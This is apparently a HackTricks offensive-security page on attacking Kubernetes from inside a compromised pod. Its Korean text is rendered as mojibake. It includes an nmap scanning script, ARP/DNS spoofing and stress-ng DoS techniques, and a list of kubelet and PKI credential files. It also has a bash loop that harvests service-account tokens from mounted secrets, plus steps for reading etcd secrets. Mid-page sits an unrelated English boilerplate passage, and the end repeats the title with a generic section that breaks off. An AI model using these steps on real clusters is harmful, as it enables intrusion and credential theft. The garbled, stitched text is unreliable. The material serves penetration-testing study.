# Attacking Kubernetes from inside a Pod

## Pod ë‚´ë¶€ì—ì„œ Kubernetes ê³µê²©í•˜ê¸°

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

### **Pod íƒˆì¶œ**

**ìš´ì´ ì¢‹ë‹¤ë©´ ë…¸ë“œë¡œ íƒˆì¶œí•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

#### Podì—ì„œ íƒˆì¶œí•˜ê¸°

Podì—ì„œ íƒˆì¶œí•˜ê¸° ìœ„í•´ì„  ë¨¼ì € **ê¶Œí•œ ìƒìŠ¹**ì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•œ ëª‡ ê°€ì§€ ê¸°ìˆ :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Compromisedëœ podì—ì„œ **íƒˆì¶œì„ ì‹œë„**í•˜ê¸° ìœ„í•´ ì´ **ë„ì»¤ íƒˆì¶œ**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

#### Kubernetes Privileges ë‚¨ìš©

**Kubernetes ì—´ê±°**ì— ëŒ€í•´ ì„¤ëª…í•œ ì„¹ì…˜ì—ì„œ ì„¤ëª…í•œëŒ€ë¡œ:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

ì¼ë°˜ì ìœ¼ë¡œ podëŠ” ë‚´ë¶€ì— **ì„œë¹„ìŠ¤ ê³„ì • í† í°**ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ ì„œë¹„ìŠ¤ ê³„ì •ì—ëŠ” í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ë‹¤ë¥¸ podë¡œ **ì´ë™**í•˜ê±°ë‚˜ ì‹¬ì§€ì–´ **ë…¸ë“œë¡œ íƒˆì¶œ**í•  ìˆ˜ ìˆëŠ” **ê¶Œí•œ**ì´ ë¶€ì—¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

#### í´ë¼ìš°ë“œ ê¶Œí•œ ë‚¨ìš©

Podê°€ **í´ë¼ìš°ë“œ í™˜ê²½**ì—ì„œ ì‹¤í–‰ëœë‹¤ë©´, **ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸**ì—ì„œ í† í°ì„ **ìœ ì¶œ**í•˜ê³  ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### ì·¨ì•½í•œ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ ê²€ìƒ‰

Kubernetes í™˜ê²½ ë‚´ë¶€ì— ìˆìœ¼ë¯€ë¡œ í˜„ì¬ podì˜ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ì—†ê³  ì»¨í…Œì´ë„ˆì—ì„œ íƒˆì¶œí•  ìˆ˜ ì—†ëŠ” ê²½ìš°, **ì ì¬ì ìœ¼ë¡œ ì·¨ì•½í•œ ì„œë¹„ìŠ¤ë¥¼ ê²€ìƒ‰**í•´ì•¼ í•©ë‹ˆë‹¤.

#### ì„œë¹„ìŠ¤

**ì´ë¥¼ ìœ„í•´ Kubernetes í™˜ê²½ì˜ ëª¨ë“  ì„œë¹„ìŠ¤ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:**

```
kubectl get svc --all-namespaces
```

ê¸°ë³¸ì ìœ¼ë¡œ KubernetesëŠ” í‰ë©´ ë„¤íŠ¸ì›Œí‚¹ ìŠ¤í‚¤ë§ˆë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŠ” í´ëŸ¬ìŠ¤í„° ë‚´ì˜ **ì–´ë–¤ íŒŸ/ì„œë¹„ìŠ¤ë“  ë‹¤ë¥¸ íŒŸ/ì„œë¹„ìŠ¤ì™€ í†µì‹ í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒ**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. í´ëŸ¬ìŠ¤í„° ë‚´ì˜ **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ ì œí•œì´ ì—†ìŠµë‹ˆë‹¤**. ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì˜ ëª¨ë“  ì‚¬ìš©ìëŠ” ë‹¤ë¥¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì™€ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ìŠ¤ìºë‹

ë‹¤ìŒ Bash ìŠ¤í¬ë¦½íŠ¸( [Kubernetes ì›Œí¬ìƒµ](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ì—ì„œ ê°€ì ¸ì˜´)ëŠ” Kubernetes í´ëŸ¬ìŠ¤í„°ì˜ IP ë²”ìœ„ë¥¼ ì„¤ì¹˜í•˜ê³  ìŠ¤ìº”í•©ë‹ˆë‹¤:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì—¬ **Kubernetes íŠ¹ì • ì„œë¹„ìŠ¤ë¥¼ ê³µê²©**í•˜ì—¬ **ë‹¤ë¥¸ íŒŸ/ì „ì²´ í™˜ê²½ì„ ì¹¨í•´**í•˜ëŠ” ë°©ë²•ì„ ë°°ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

#### ìŠ¤ë‹ˆí•‘

**ì¹¨í•´ëœ íŒŸì´ ë‹¤ë¥¸ íŒŸì´ ì¸ì¦í•´ì•¼ í•˜ëŠ” ë¯¼ê°í•œ ì„œë¹„ìŠ¤ë¥¼ ì‹¤í–‰**í•˜ëŠ” ê²½ìš°, **ë¡œì»¬ í†µì‹ ì„ ìŠ¤ë‹ˆí•‘**í•˜ì—¬ ë‹¤ë¥¸ íŒŸì—ì„œ ë³´ë‚´ëŠ” ìê²© ì¦ëª…ì„ ì–»ì„ ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### ë„¤íŠ¸ì›Œí¬ ìŠ¤í‘¸í•‘

ê¸°ë³¸ì ìœ¼ë¡œ **ARP ìŠ¤í‘¸í•‘** (ê·¸ë¦¬ê³  ê·¸ë¡œ ì¸í•´ **DNS ìŠ¤í‘¸í•‘**)ê³¼ ê°™ì€ ê¸°ìˆ ì€ Kubernetes ë„¤íŠ¸ì›Œí¬ì—ì„œ ì‘ë™í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, íŒŸ ë‚´ì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **NET\_RAW ê¸°ëŠ¥**ì´ ìˆìœ¼ë¯€ë¡œ ì‚¬ìš©ì ì •ì˜ë¡œ ìƒì„±ëœ ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì„ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°, **ë™ì¼í•œ ë…¸ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” ëª¨ë“  íŒŸì— ëŒ€í•´ ARP ìŠ¤í‘¸í•‘ì„ í†µí•œ MitM ê³µê²©ì„ ìˆ˜í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ, **ì•…ì„± íŒŸ**ì´ **DNS ì„œë²„ì™€ ë™ì¼í•œ ë…¸ë“œì—ì„œ ì‹¤í–‰**ëœë‹¤ë©´, í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  íŒŸì— ëŒ€í•´ **DNS ìŠ¤í‘¸í•‘ ê³µê²©ì„ ìˆ˜í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

### ë…¸ë“œ DoS

Kubernetes ë§¤ë‹ˆí˜ìŠ¤íŠ¸ì—ëŠ” ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ëª…ì‹œì ì¸ ì‚¬ì–‘ì´ ì—†ìœ¼ë©°, ì»¨í…Œì´ë„ˆì— ëŒ€í•œ **ì ìš©ëœ ì œí•œ ë²”ìœ„ê°€ ì—†ìŠµë‹ˆë‹¤**. ê³µê²©ìë¡œì„œ, ìš°ë¦¬ëŠ” **íŒŸ/ë°°í¬ê°€ ì‹¤í–‰ë˜ëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ëª¨ë‘ ì†Œë¹„**í•˜ì—¬ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ë¥¼ ê³ ê°ˆì‹œí‚¤ê³  í™˜ê²½ì— ëŒ€í•œ DoSë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì‘ì—…ì€ [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```

`stress-ng`ë¥¼ ì‹¤í–‰í•˜ëŠ” ë™ì•ˆê³¼ ì´í›„ì˜ ì°¨ì´ì ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```

### ë…¸ë“œ í›„í–‰ ì‘ì—…

ì»¨í…Œì´ë„ˆì—ì„œ íƒˆì¶œì— ì„±ê³µí–ˆë‹¤ë©´ ë…¸ë“œì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ í¥ë¯¸ë¡œìš´ ì‚¬í•­ì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì»¨í…Œì´ë„ˆ ëŸ°íƒ€ì„ í”„ë¡œì„¸ìŠ¤ (Docker)
* ì´ì™€ ê°™ì€ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ë” ë§ì€ íŒŸ/ì»¨í…Œì´ë„ˆ (ë” ë§ì€ í† í°ì„ ì–»ì„ ìˆ˜ ìˆìŒ)
* ì „ì²´ íŒŒì¼ ì‹œìŠ¤í…œ ë° ì¼ë°˜ì ì¸ ìš´ì˜ ì²´ì œ
* ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ Kube-Proxy ì„œë¹„ìŠ¤
* ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ Kubelet ì„œë¹„ìŠ¤. êµ¬ì„± íŒŒì¼ì„ í™•ì¸í•˜ì„¸ìš”:
* ë””ë ‰í„°ë¦¬: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* ë‹¤ë¥¸ Kubernetes ê³µí†µ íŒŒì¼:
* `$HOME/.kube/config` - ì‚¬ìš©ì êµ¬ì„±
* `/etc/kubernetes/kubelet.conf`- ì¼ë°˜ êµ¬ì„±
* `/etc/kubernetes/bootstrap-kubelet.conf` - ë¶€íŠ¸ìŠ¤íŠ¸ë© êµ¬ì„±
* `/etc/kubernetes/manifests/etcd.yaml` - etcd êµ¬ì„±
* `/etc/kubernetes/pki` - Kubernetes í‚¤

#### ë…¸ë“œ kubeconfig ì°¾ê¸°

ì´ì „ì— ì–¸ê¸‰í•œ ê²½ë¡œ ì¤‘ í•˜ë‚˜ì—ì„œ kubeconfig íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ì—†ëŠ” ê²½ìš° kubelet í”„ë¡œì„¸ìŠ¤ì˜ `--kubeconfig` ì¸ìë¥¼ í™•ì¸í•˜ì„¸ìš”:

```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```

#### ë¹„ë°€ ì •ë³´ ë„ë‚œ

To steal secrets from within a pod, you can use various techniques depending on the specific scenario. Here are a few common methods:

1. **Pod-to-Pod Communication**: If the target pod communicates with other pods, you can intercept the network traffic to capture sensitive information. This can be done by deploying a malicious pod in the same network namespace and using tools like Wireshark or tcpdump to capture the traffic.
2. **Pod-to-Service Communication**: Similarly, if the target pod communicates with services within the cluster, you can intercept the traffic to steal secrets. By deploying a malicious pod and configuring it as a service, you can redirect the traffic to capture the desired information.
3. **Exploiting Vulnerabilities**: If the target pod has any known vulnerabilities, you can exploit them to gain unauthorized access and steal secrets. This could involve exploiting misconfigurations, weak authentication mechanisms, or outdated software versions.
4. **Accessing Mounted Volumes**: If the pod has mounted volumes, you can access the files stored within them to steal secrets. By gaining access to the pod's filesystem, you can search for sensitive files or configuration files that may contain valuable information.

Remember, these techniques should only be used for ethical purposes, such as penetration testing or securing your own infrastructure. Unauthorized access or data theft is illegal and can have severe consequences.

```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```

ìŠ¤í¬ë¦½íŠ¸ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)ì€ ìë™ìœ¼ë¡œ **ë‹¤ë¥¸ íŒŸì˜ í† í°ì„ ê°€ì ¸ì™€ì„œ ì›í•˜ëŠ” ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸**í•©ë‹ˆë‹¤ (1ê°œì”© í™•ì¸í•˜ëŠ” ëŒ€ì‹ ).

```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```

#### íŠ¹ê¶Œ DaemonSets

DaemonSetì€ í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë…¸ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” íŒŸì…ë‹ˆë‹¤. ë”°ë¼ì„œ, íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ êµ¬ì„±ëœ DaemonSetì˜ í† í°ì„ ëª¨ë“  ë…¸ë“œì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©° ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì·¨ì•½ì ì€ ì´ì „ ì„¹ì…˜ê³¼ ë™ì¼í•˜ì§€ë§Œ, ì´ì œ ìš´ì´ ì•„ë‹Œ ë‹¤ë¥¸ ë°©ë²•ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

#### í´ë¼ìš°ë“œë¡œì˜ í”¼ë²—

í´ëŸ¬ìŠ¤í„°ê°€ í´ë¼ìš°ë“œ ì„œë¹„ìŠ¤ë¡œ ê´€ë¦¬ë˜ëŠ” ê²½ìš°, ë…¸ë“œëŠ” íŒŸê³¼ëŠ” ë‹¤ë¥¸ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ë…¸ë“œì—ì„œ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  ì‹œë„í•˜ì„¸ìš” (ë˜ëŠ” hostNetworkê°€ Trueë¡œ ì„¤ì •ëœ íŒŸì—ì„œ):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

#### etcd ë„ìš©

ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ë…¸ë“œì˜ [nodeName](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ì„ ì§€ì •í•  ìˆ˜ ìˆë‹¤ë©´, ì œì–´ í”Œë ˆì¸ ë…¸ë“œ ë‚´ì—ì„œ ì‰˜ì„ ì–»ê³  etcd ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

ì œì–´ í‰ë©´ ë…¸ë“œëŠ” **ë§ˆìŠ¤í„° ì—­í• **ì„ ê°–ê³  ìˆìœ¼ë©°, **í´ë¼ìš°ë“œ ê´€ë¦¬ í´ëŸ¬ìŠ¤í„°ì—ì„œëŠ” í•´ë‹¹ ë…¸ë“œì—ì„œ ì•„ë¬´ ì‘ì—…ë„ ì‹¤í–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.

**etcdì—ì„œ ì‹œí¬ë¦¿ ì½ê¸°**

íŒŒë“œ ìŠ¤í™ì˜ `nodeName` ì„ íƒê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì œì–´ í‰ë©´ ë…¸ë“œì—ì„œ íŒŒë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´, ëª¨ë“  êµ¬ì„± ë° ì‹œí¬ë¦¿ì„ í¬í•¨í•œ í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  êµ¬ì„±ì„ í¬í•¨í•˜ëŠ” `etcd` ë°ì´í„°ë² ì´ìŠ¤ì— ì‰½ê²Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•„ë˜ëŠ” í˜„ì¬ ì‚¬ìš© ì¤‘ì¸ ì œì–´ í‰ë©´ ë…¸ë“œì—ì„œ `etcd`ì—ì„œ ì‹œí¬ë¦¿ì„ ê°€ì ¸ì˜¤ëŠ” ë¹ ë¥´ê³  ê°„ë‹¨í•œ ë°©ë²•ì…ë‹ˆë‹¤. `etcd` í´ë¼ì´ì–¸íŠ¸ ìœ í‹¸ë¦¬í‹°ì¸ `etcdctl`ì„ ì‚¬ìš©í•˜ì—¬ ì œì–´ í‰ë©´ ë…¸ë“œì˜ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ ì–´ë””ì—ì„œë“  ì‹¤í–‰ ì¤‘ì¸ etcdì— ì—°ê²°í•˜ëŠ” ë” ìš°ì•„í•œ ì†”ë£¨ì…˜ì„ ì›í•œë‹¤ë©´, @mauilionì˜ [ì´ ì˜ˆì œ ë§¤ë‹ˆí˜ìŠ¤íŠ¸](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

**ì œì–´ í‰ë©´ ë…¸ë“œì—ì„œ `etcd`ê°€ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸í•˜ê³  ë°ì´í„°ë² ì´ìŠ¤ê°€ ì–´ë””ì— ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš” (`kubeadm`ìœ¼ë¡œ ìƒì„±ëœ í´ëŸ¬ìŠ¤í„°ì—ì„œ)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

## Pod ë‚´ë¶€ì—ì„œ Kubernetes ê³µê²©í•˜ê¸°

ì´ ë¬¸ì„œì—ì„œëŠ” Kubernetes í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì—ì„œ Pod ë‚´ë¶€ì—ì„œ ê³µê²©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆì˜ ê¶Œí•œì„ ì´ìš©í•˜ì—¬ Kubernetes í´ëŸ¬ìŠ¤í„° ì „ì²´ì— ì•…ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 1. Pod ë‚´ë¶€ì—ì„œì˜ ê¶Œí•œ ìƒìŠ¹

Pod ë‚´ë¶€ì—ì„œ ê¶Œí•œ ìƒìŠ¹ì„ ì‹œë„í•˜ëŠ” ì²« ë²ˆì§¸ ë‹¨ê³„ëŠ” í˜„ì¬ ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆì˜ ê¶Œí•œ ìˆ˜ì¤€ì„ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.

```bash
$ id
```

ì»¨í…Œì´ë„ˆì˜ ì‚¬ìš©ì IDì™€ ê·¸ë£¹ IDë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2. Pod ë‚´ë¶€ì—ì„œì˜ í´ëŸ¬ìŠ¤í„° ê¶Œí•œ í™•ì¥

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í´ëŸ¬ìŠ¤í„°ì˜ ì¼ë¶€ ê¶Œí•œì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì—ì„œ ë‹¤ì–‘í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, `kubectl` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ë¦¬ì†ŒìŠ¤ë¥¼ ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ í˜„ì¬ í´ëŸ¬ìŠ¤í„°ì˜ ìƒíƒœë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
$ kubectl cluster-info
```

ë˜í•œ, `kubectl`ì„ ì‚¬ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë‹¤ë¥¸ Podì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ í˜„ì¬ í´ëŸ¬ìŠ¤í„°ì˜ Pod ëª©ë¡ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
$ kubectl get pods --all-namespaces
```

### 3. Pod ë‚´ë¶€ì—ì„œì˜ ë„¤íŠ¸ì›Œí¬ íƒìƒ‰

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë‹¤ë¥¸ Pod ë° ì„œë¹„ìŠ¤ì— ëŒ€í•œ ë„¤íŠ¸ì›Œí¬ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë„¤íŠ¸ì›Œí¬ë¥¼ íƒìƒ‰í•˜ê³  ë‹¤ë¥¸ Pod ë˜ëŠ” ì„œë¹„ìŠ¤ì— ëŒ€í•œ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, `ping` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ Pod ë˜ëŠ” ì„œë¹„ìŠ¤ì˜ IP ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ íŠ¹ì • Pod ë˜ëŠ” ì„œë¹„ìŠ¤ì˜ IP ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
$ ping <pod ë˜ëŠ” ì„œë¹„ìŠ¤ IP ì£¼ì†Œ>
```

### 4. Pod ë‚´ë¶€ì—ì„œì˜ ë°ì´í„° ìœ ì¶œ

Pod ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì»¨í…Œì´ë„ˆëŠ” í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ë°ì´í„°ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

